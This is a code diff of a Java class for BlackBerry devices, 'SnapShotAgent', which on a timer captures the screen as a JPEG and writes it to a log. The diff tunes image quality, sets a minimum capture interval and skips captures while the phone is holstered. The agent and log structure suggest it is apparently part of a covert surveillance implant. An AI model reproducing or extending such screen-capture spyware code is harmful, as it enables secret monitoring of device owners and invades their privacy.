@@ -3,6 +3,7 @@ package blackberry.agent;
 import java.io.EOFException;
 
 import net.rim.device.api.system.Bitmap;
+import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.system.Display;
 import net.rim.device.api.system.EncodedImage;
 import net.rim.device.api.system.JPEGEncodedImage;
@@ -14,14 +15,20 @@ import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 import blackberry.utils.WChar;
 
+/**
+ * TODO : evitare lo snapshot se l'immagine e' nera.
+ * Cominciare a vedere se e' in holster.
+ * @author user1
+ *
+ */
 public class SnapShotAgent extends Agent {
-    private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 75;
-
-    private static final int LOG_SNAPSHOT_VERSION = 2009031201;
-
-    //#debug
+	 //#debug
     static Debug debug = new Debug("SnapShotAgent", DebugLevel.NOTIFY);
-
+    
+    private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 50;
+    private static final int LOG_SNAPSHOT_VERSION = 2009031201;
+	private static final int MIN_TIMER = 30 * 1000;
+   
     private int timerMillis = 60 * 1000;
     private boolean onNewWindow = false;
 
@@ -43,6 +50,14 @@ public class SnapShotAgent extends Agent {
 
         // #debug
         debug.info("Taking snapshot");
+        
+        
+        if(DeviceInfo.isInHolster())
+        {
+        	debug.warn("In Holster, skipping snapshot");
+        	return;
+        }
+        
         final int width = Display.getWidth();
         final int height = Display.getHeight();
 
@@ -74,7 +89,7 @@ public class SnapShotAgent extends Agent {
         log.close();
 
         // #debug
-        debug.trace("finished sleep");
+        debug.trace("finished run");
 
     }
 
@@ -120,7 +135,7 @@ public class SnapShotAgent extends Agent {
 
             int value = databuffer.readInt();
 
-            if (value >= 1000) {
+            if (value >= MIN_TIMER) {
                 this.timerMillis = value;
             }
             // #debug
